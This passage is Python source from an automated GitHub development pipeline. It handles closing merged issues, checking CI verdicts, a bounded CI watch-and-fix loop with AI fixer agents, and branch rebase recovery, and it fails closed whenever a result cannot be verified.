    """Surface a terminal NON-gate failure: drop in-progress, raise autodev:failed, then
    return the result the run terminates with (item 3 — never a silent zombie)."""
    await _unlabel(repo, issue_number, LABEL_IN_PROGRESS)
    await _label(repo, issue_number, LABEL_FAILED)
    return result


async def _close_source_issue(repo, issue_number):
    """Terminal post-merge cleanup (#1188, #1208): a confirmed merge is the issue's
    resolution, so close the source issue and strip its in-flight CLAIM labels so it leaves
    the open-issue working set instead of reading as live to a dispatch-gate sweep / rank-6
    staleness reaper.

    **CLOSE-BEFORE-STRIP ordering (#1208 fail-safe).** ``dispatched`` is the claim that keeps
    a merged issue OUT of the dispatch gate (``approved ∧ shovel-ready ∧ ¬dispatched``). If we
    stripped it BEFORE the close and the close then failed, the issue would be left
    OPEN ∧ ¬``dispatched`` — RE-ARMED for a duplicate build of already-merged work (strictly
    worse than pre-#1188, where a merged issue stayed OPEN ∧ ``dispatched`` and was safe). So
    the ``dispatched`` strip is GATED on a confirmed close: never strip it unless the issue is
    actually closed, so a close-failure fails SAFE to OPEN ∧ ``dispatched``.

    Idempotent, best-effort steps, in this order:
      1. PATCH ``/issues/{n}`` to ``state:closed`` + ``state_reason:completed`` — closing the
         issue on its OWN merge (the pipeline's PR bodies carry no ``Closes #N`` linkage, so
         GitHub never auto-closes). Re-closing an already-closed issue is a GitHub no-op (200).
         (Before #1208 the route allowlist omitted PATCH, so this call was rejected by the
         broker before it reached GitHub and the close silently never fired.)
      2. Log the close response (rank-6): a non-2xx close is surfaced, never swallowed.
      3. ONLY IF the close confirmed (200), DELETE ``dispatched`` — the dispatch-gate claim is
         safe to drop precisely because the issue is now closed. A label already gone is a 404
         no-op, exactly what a re-drive wants.
      4. DELETE ``autodev:in-progress`` regardless — it is NOT a dispatch-gate predicate, so
         dropping it on a failed close cannot re-arm a re-dispatch; stripping it best-effort
         keeps the in-flight surface clean.

    Returns the close (PATCH) gh() response. Pure of LLM/time/random; only GitHub I/O."""
    # Step 1 — close the issue FIRST (re-close of an already-closed issue is a 200 no-op).
    close_resp = await gh("PATCH", _ipath(repo, "/issues/%d" % issue_number),
                          {"state": "closed", "state_reason": "completed"})
    # Step 2 — surface the outcome (rank-6): a failed close is visible, not silently swallowed.
    st = _status(close_resp)
    closed = st == 200
    if closed:
        log("closed source issue #%d (state=closed, reason=completed)" % issue_number)
    else:
        log("close source issue #%d FAILED -> %r %r" % (issue_number, st, close_resp))
    # Step 3 — strip `dispatched` ONLY on a confirmed close (#1208 fail-safe). A close-failure
    # leaves the issue OPEN ∧ `dispatched` (still claimed, never re-dispatched), NOT
    # OPEN ∧ ¬`dispatched` (which re-arms the dispatch gate for already-merged work).
    if closed:
        await _unlabel(repo, issue_number, LABEL_DISPATCHED)
    else:
        log("keeping `dispatched` on #%d — close did not confirm, failing safe to "
            "OPEN+dispatched (not the #1208 re-dispatch loop)" % issue_number)
    # Step 4 — strip in-progress regardless (not a dispatch-gate predicate; best-effort).
    await _unlabel(repo, issue_number, LABEL_IN_PROGRESS)
    return close_resp


async def _file_followup(repo, title, body):
    """Open a best-effort follow-up issue for an ADVISORY post-merge signal (a red or
    indeterminate master-CI watch). The merge is already a committed fact and the run has
    already returned done, so this is a non-blocking alert: it must NEVER re-suspend the run,
    and a create failure is swallowed (gh already retries transient 5xx). Returns the created
    issue number when GitHub reports it, else None."""
    resp = await gh("POST", _ipath(repo, "/issues"), {"title": title, "body": body})
    created = _json_body(resp)
    if isinstance(created, dict):
        return created.get("number")
    return None


async def _ci_verdict(repo, pr_number, ci, polled_head):
    """Classify a ``watch_ci`` verdict — a SCRIPT-side (uncorrelated) re-check of the
    correlated agent's claim, closing the two false-green holes the forensics found. Returns
    one of three labels (NOT a bool), so the caller can distinguish a genuinely-broken tree
    (FIX it) from an unverified-pass (just RE-WATCH — never run a fixer against passing code):

      * ``"pass"``  — a TRUSTED green/no_ci: safe to proceed to merge.
      * ``"red"``   — the agent RETURNED a red verdict: the tree is genuinely broken -> fix.
      * ``"retry"`` — a green/no_ci we could NOT trust (unverifiable head, premature checks):
                      re-watch on the next iteration; do NOT dispatch a fixer (the code is not
                      broken, CI just hasn't settled / we couldn't confirm the head).

    A green / no_ci is trusted as ``"pass"`` ONLY when ALL hold:

    1. **A verifiable head exists.** The watch reports ``polled_sha`` (the commit it inspected).
       We need an EXPECTED head to compare it against: GitHub's LIVE ``GET /pulls/{n}`` head,
       or — only if that read comes back empty — the SHA we dispatched the watch with. If
       NEITHER is available (both empty) we CANNOT verify the head, so we fail CLOSED to
       ``"retry"`` rather than trust an unverifiable pass (#1314). A missing ``polled_sha`` is
       likewise unverifiable -> ``"retry"``.
    2. **The polled commit IS that head (#1314).** An empty re-trigger commit pushed onto the
       WRONG parent never becomes head, so its ``total_count=0`` ``no_ci`` must not count.
    3. **The full required-check set concluded (#1364).** A ``green`` declared while lint/unit
       are still running is premature; require ``required_complete`` (``no_ci`` is exempt —
       there are no required checks to wait on).

    Never RAISES for a logic reason — only the underlying ``gh`` read can raise (a truncated
    body), which the caller's loop is not expected to catch; that surfaces as a recoverable
    errored run, the correct disposition for a persistent read fault."""
    status = ci.get("status")
    if status == "red":
        return "red"
    if status not in ("green", "no_ci"):
        # An unexpected status (schema should prevent it) is treated as a non-pass we re-watch.
        return "retry"
    polled_sha = ci.get("polled_sha", "")
    if not polled_sha:
        log("ci verdict %r has no polled_sha -> cannot verify head, re-watching" % status)
        return "retry"
    # #1364 premature-green: green must see the FULL required-check set concluded. no_ci has
    # no required checks, so the completeness flag does not apply to it.
    if status == "green" and not ci.get("required_complete", False):
        log("ci verdict green but required_complete is false -> premature, re-watching")
        return "retry"
    # #1314 wrong-parent: the polled commit must be the LIVE PR head. Prefer GitHub's live
    # head; fall back to the dispatched SHA ONLY if the live read is empty. If we have NO
    # anchor at all, fail CLOSED to retry (never trust an unverifiable head — the fail-OPEN
    # hole the review caught).
    live_head = await _live_head_sha(repo, pr_number)
    expected = live_head or polled_head
    if not expected:
        log("ci verdict %r but no verifiable head (live+dispatched both empty) -> re-watching"
            % status)
        return "retry"
    if not _shas_equal(polled_sha, expected):
        log("ci verdict %r polled %r but expected head %r -> wrong-parent, re-watching"
            % (status, polled_sha, expected))
        return "retry"
    return "pass"


async def _watch_ci(repo, pr_number, head_sha, comment_bodies, model, label_prefix):
    """The bounded CI watch->fix->re-watch loop, factored out so it can be RE-ENTERED after a
    sync/rebase heals the branch (#1385): a successful rebase force-pushes a new tip, so CI
    must re-run on the updated branch before merge. The ``label_prefix`` distinguishes the
    labels of the second entry (``reci-…``) from the first (``ci-…``) so replay stays
    deterministic (a distinct call_key per ci-FIX agent invocation).

    The WATCH itself is DETERMINISTIC (issue #1316): each iteration polls both GitHub CI
    surfaces (Checks + combined-status) for ``head_sha`` via ``watch_ci`` — NO agent/model.
    Only ``fix_ci`` (repairing a red build) stays an agent(), so the only AgentError this loop
    can surface is a ci-FIX failure. The deterministic read inspects EXACTLY the commit it is
    handed, so the #1314 wrong-parent false-green hole cannot open (there is no agent
    self-reporting a polled commit), and a green/no_ci verdict already requires the FULL check
    set to be terminal (the ``_ci_poll_verdict`` reducer), subsuming the #1364 premature-green
    guard. The post-rebase #1389 correctness is preserved by the CALLER: the S-SYNC re-entry
    re-reads the LIVE post-rebase head (``_live_head_sha``) and hands THAT sha here, so a stale
    pre-rebase commit's old green checks are never polled.

    Returns ``(ci_ok, ci_agent_error, head_sha)``: ``ci_ok`` True on green/no_ci, else the
    caller parks at the verify gate; ``ci_agent_error`` distinguishes a flaky ci-FIX-agent
    break from plain CI exhaustion; ``head_sha`` is the (possibly fix-advanced) head for
    downstream nodes. Bounded N watches / N-1 fixes — matches autodev's CI loop."""
    ci_ok = False
    ci_agent_error = False
    for i in range(MAX_CI_ITERS):
        # The watch is a DETERMINISTIC read of the GitHub Checks + combined-status API for the
        # current head_sha (no agent, no AgentError to catch). A still-running build that never
        # reaches terminal within the bound fails SAFE to red (escalates to the verify gate) —
        # never a silent green. A green/no_ci is trusted only when every reported check/status
        # is terminal.
        ci = await watch_ci(repo, head_sha, MAX_CI_ITERS)
        if ci["status"] in ("green", "no_ci"):
            ci_ok = True
            break
        # ci["status"] == "red": the tree is genuinely broken -> dispatch the bounded fixer.
        if i == MAX_CI_ITERS - 1:
            break
        before = head_sha
        try:
            fix = await agent(
                {"task": "fix_ci", "repo": repo, "pr_number": pr_number,
                 "detail": ci.get("detail", ""), "comments": comment_bodies,
                 "lint_hint": FIX_CI_LINT_HINT},
                agent_id=FIX_AGENT_ID, output_schema=FIX_SCHEMA, model=model,
                label="%s-fix-%d" % (label_prefix, i))
            head_sha = fix["head_sha"]
        except AgentError as exc:
            log("ci-fix agent error -> escalate:", exc)
            ci_agent_error = True
            break
        if before and head_sha == before:
            break
    return ci_ok, ci_agent_error, head_sha


async def _live_head_sha(repo, pr_number):
    """Re-read the LIVE PR head SHA via ``GET /pulls/{n}`` after a rebase force-pushed a new
    tip. The CI watch MUST key on the POST-rebase SHA, not the stale pre-rebase one: the old
    commit carries the OLD (pre-rebase) green checks, and reporting it green would merge a tip
    whose CI never re-ran (#1389). Returns ``""`` on a read failure OR a non-SHA-1 value
    (a 64-char SHA-256 GitHub's REST endpoints reject, #1178) — callers fall back to whatever
    (possibly agent-reported) SHA they already hold and never silently trust junk."""
    pr = _json_body(await gh("GET", _ipath(repo, "/pulls/%d" % pr_number)))
    sha = _pr_head_sha(pr)
    return sha if _is_sha1(sha) else ""


async def _sync_branch(repo, pr_number, branch, comment_bodies, model):
    """Rebase/sync recovery stage (#1385): HEAL a branch master moved under instead of
    parking or orphaning it. Returns one of:

      - ``{"outcome": "noop"}``      — branch already current with master (idempotent no-op);
                                       the CI watch does NOT need re-entry.
      - ``{"outcome": "rebased", "head_sha": <sha or "">}`` — the branch was rebased (mechanically
                                       or agent-resolved); the caller MUST re-enter the CI watch
                                       so CI re-runs on the updated branch before merge.
      - ``{"outcome": "conflict", "detail": <str>}`` — still unresolved after the bounded fix-agent
                                       attempts; the caller parks at the ``rebase_conflict`` gate.
      - ``{"outcome": "error", "detail": <str>}`` — a plumbing failure attempting the rebase;
                                       the caller parks at the ``rebase_conflict`` gate too (we
                                       cannot prove the branch is healthy — fail closed).

    Flow: (1) read mergeability via ``GET /pulls/{n}``; a clean/unknown-but-benign branch is a
    no-op. (2) A DIRTY/behind/conflicting branch gets a MECHANICAL ``git rebase origin/master``
    + force-push-with-lease (``_rebase_command``). A clean replay -> rebased; an already-current
    branch -> no-op (idempotent). (3) A REAL conflict hands off to the SAME fix agent ``fix_ci``
    uses, with a resolve-conflicts task, bounded to MAX_REBASE_ATTEMPTS; each attempt re-runs
    the mechanical rebase to confirm the branch is now clean. (4) Still conflicted after the
    budget -> conflict (the caller parks at the new ``rebase_conflict`` gate)."""
    # (1) Mergeability probe — a clean branch is the common case and a clean no-op.
    pr = _json_body(await gh("GET", _ipath(repo, "/pulls/%d" % pr_number)))
    if not _needs_rebase(pr):
        log("sync: PR #%d is mergeable (state=%r) -> no rebase needed"
            % (pr_number, pr.get("mergeable_state") if isinstance(pr, dict) else None))
        return {"outcome": "noop"}

    # (2) Mechanical rebase first — the cheap, deterministic path that heals the common
    # master-moved-under-with-no-textual-conflict case without spending an agent.
    rb = await tool("bash", {"command": _rebase_command(repo, branch), "timeout_seconds": 600})
    code = rb.get("exit_code") if isinstance(rb, dict) else None
    if code == REBASE_EXIT_NOOP:
        log("sync: branch %r already current with %s -> no-op" % (branch, BASE_BRANCH))
        return {"outcome": "noop"}
    if code == REBASE_EXIT_DONE:
        log("sync: mechanical rebase of %r onto %s succeeded -> re-enter CI"
            % (branch, BASE_BRANCH))
        return {"outcome": "rebased", "head_sha": await _live_head_sha(repo, pr_number)}
    if code == REBASE_EXIT_ERROR:
        detail = "%s\n%s\nexit=%r" % (
            (rb.get("stdout", "") if isinstance(rb, dict) else "")[-800:],
            (rb.get("stderr", "") if isinstance(rb, dict) else "")[-400:], code)
        log("sync: mechanical rebase plumbing error -> fail closed to rebase_conflict gate")
        return {"outcome": "error", "detail": detail}

    # (3) REAL conflict (REBASE_EXIT_CONFLICT) -> hand off to the fix agent, bounded. Each
    # attempt: dispatch the resolve-conflicts task, then RE-RUN the mechanical rebase to
    # CONFIRM the agent actually healed the branch (a no-op/done exit proves it).
    last_detail = "mechanical rebase hit conflicts git could not auto-resolve"
    for attempt in range(MAX_REBASE_ATTEMPTS):
        try:
            fix = await agent(
                {"task": "fix_ci", "repo": repo, "pr_number": pr_number,
                 "detail": last_detail, "comments": comment_bodies,
                 "rebase_hint": FIX_REBASE_HINT, "lint_hint": FIX_CI_LINT_HINT},
                agent_id=FIX_AGENT_ID, output_schema=FIX_SCHEMA, model=model,
                label="rebase-fix-%d" % attempt)
        except AgentError as exc:
            last_detail = "rebase-fix agent error: %s" % exc
            log("sync: rebase-fix agent error on attempt %d:" % attempt, exc)
            continue
        # Confirm the branch is now mergeable by re-running the mechanical rebase: a
        # NOOP (the agent rebased + pushed) or a clean DONE proves it healed.
        confirm = await tool("bash",
                             {"command": _rebase_command(repo, branch), "timeout_seconds": 600})
        ccode = confirm.get("exit_code") if isinstance(confirm, dict) else None
        if ccode in (REBASE_EXIT_NOOP, REBASE_EXIT_DONE):
            log("sync: rebase conflict resolved by fix agent on attempt %d" % attempt)
            # Re-read the LIVE PR head rather than trusting the fix agent's reported
            # head_sha: the confirm rebase above may itself have force-pushed a new tip,
            # so the agent-reported SHA can already be stale. Fall back to the agent's
            # value only if the live re-read comes back empty (plumbing hiccup).
            live = await _live_head_sha(repo, pr_number)
            agent_sha = fix.get("head_sha", "") if isinstance(fix, dict) else ""
            return {"outcome": "rebased", "head_sha": live or agent_sha}
        last_detail = ("rebase still conflicting after fix attempt %d (confirm exit=%r)"
                       % (attempt, ccode))
        log("sync:", last_detail)
    return {"outcome": "conflict", "detail": last_detail}
'''
